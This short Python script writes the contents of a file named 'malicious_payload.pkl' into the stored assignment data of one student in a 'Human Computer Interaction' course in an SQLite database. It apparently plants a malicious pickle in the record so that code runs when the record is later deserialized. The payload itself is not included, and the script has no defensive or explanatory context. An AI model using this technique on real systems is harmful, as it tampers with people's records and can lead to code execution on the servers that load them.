import sqlite3

with open("malicious_payload.pkl", "rb") as f:
    malicious_data = f.read()

conn = sqlite3.connect('normal.db')

c = conn.cursor()

c.execute("""
    UPDATE assignments
    SET file_data = ?
    WHERE student_id = ? AND course = ?
""", (malicious_data, 2, 'Human Computer Interaction'))

conn.commit()
conn.close()



